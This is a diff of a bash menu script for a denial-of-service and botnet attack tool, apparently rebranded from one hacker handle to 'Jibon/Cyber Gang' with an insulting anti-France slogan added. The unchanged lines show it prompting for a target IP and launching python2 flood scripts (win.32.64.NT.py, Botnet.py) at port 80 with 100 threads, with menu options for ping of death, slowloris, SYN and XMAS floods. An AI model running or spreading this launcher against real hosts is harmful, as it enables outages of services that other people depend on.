@@ -14,17 +14,17 @@ clear
 toilet -f standard "•⊱•Mrlinkerrorsystem" -F gay
 echo
 echo $green"=========================================="
-echo $red"DoS AND DDoS ATTACK LAUCH VIA TOOL •⊱•Mrlinkerrorsystem"
+echo $red"DoS AND DDoS ATTACK JIBON  VIA TOOL •⊱•CYBER GANG"
 echo $green"=========================================="
 echo $red"===    ===    ===    ===   ===    ===   ==="
 echo $white"===    ===    ===    ===   ===    ===   ==="
             echo $red"        ____...------------...____"
             echo $red"   _:-:: /o/ ---------------- \o\_ :-:_" 
-            echo $green" .:     / / •⊱•Mrlinkerrorsystem \ \     :."
+            echo $green" .:     / / •⊱JIBON-CYBER GANG/CSS \ \     :."
             echo $red" |=====/o/======================\o\=====|" 
             echo $red" |____/_/________..____..________\_\____|" 
             echo $red" :   _/ \_     :_oβ:__:βo_:     _/ \_   :" 
-            echo $green" \__/_____\####/•⊱•Mrlinkerrorsystem/####/__\__/"
+            echo $green" \__/_____\####/•⊱•Cyber Gang/####/__\__/"
             echo $yellow"  |===\!/========================\!/===|"
             echo $red"  |   |=|          .---.         |=|   |" 
             echo $red"  |===|o|=========/     \========|o|===|  " 
@@ -37,12 +37,12 @@ echo $white"===    ===    ===    ===   ===    ===   ==="
 echo $green"==========================================="
 echo $white"                  MENU                     "
 echo $green"============================================="
-echo $red"[1].DDOS ATTACK.   #•⊱•Mrlinkerrorsystem"
-echo $red"[2].DoS ATTACK.    #081316577616"
-echo $red"[3].BOTNET ATTACK. #•⊱•Mrlinkerrorsystem"
-echo $red"[4].EXIT TOOL.     #    Selamat Menggunakan"
+echo $red"[1].DDOS ATTACK.   #•⊱•AJIJUL HASAN JIBON"
+echo $red"[2].DoS ATTACK.    #We Are Cyber Warrior"
+echo $red"[3].BOTNET ATTACK. #•⊱•FUCK YOU FRANCE"
+echo $red"[4].EXIT TOOL.     # Thanks All Cyber People "
 echo $green"============================================="
-echo $white "╭─"$yellow"•⊱•Mrlinkerrorsystem"
+echo $white "╭─"$yellow"•⊱•Press -1 to Next"
 read -p " ╰─> " pil
 
 #DDOS
@@ -59,7 +59,7 @@ echo $yellow"[3].PING OF DEADHT"
 echo $yellow"[4].POF ARMAGEDON LEVEL"
 echo $yellow"[5].LORIS"
 echo $green"============================================="
-echo $white "╭─"$yellow"•⊱•Mrlinkerrorsystem"
+echo $white "╭─"$yellow"•⊱•Press 1 to Start"
 read -p " ╰─> " ddos
 fi
 
@@ -110,7 +110,7 @@ echo $yellow"[3].UFOSYN(PC)"
 echo $yellow"[4].XMAS(PC)"
 echo $yellow"[5].ANDROMEDA(TERMUX)"
 echo $green"============================================="
-echo $white "╭─"$yellow"•⊱•Mrlinkerrorsystem"
+echo $white "╭─"$yellow"•⊱•Jibon Vai"
 read -p " ╰─> " dos
 fi
 
@@ -120,7 +120,7 @@ if [ $dos = 1 ] || [ $dos = 1 ]
 then
 clear
 toilet -f slant "WIN"
-echo $red"MASUKAN IP TARGET"
+echo $red" IP TARGET"
 read -p "===>" win
 python2 win.32.64.NT.py -s$win -p80 -t100
 fi
@@ -149,7 +149,7 @@ if [ $dos = 5 ] || [ $dos = 5 ]
 then
 clear
 toilet -f slant "DROID RX" |lolcat
-echo $red"MASUKAN IP TARGET"
+echo $red" IP TARGET"
 read -p "===>" ipt
 clear
 echo
@@ -164,7 +164,7 @@ if [ $pil = 3 ] || [ pil = 3 ]
 then
 clear
 toilet -f slant " BOTNET" -F gay
-echo $red"MASUKAN IP TARGET"
+echo $red" IP TARGET"
 read -p "==>" bot
 python2 Botnet.py -s$bot -p80 -t100
 fi
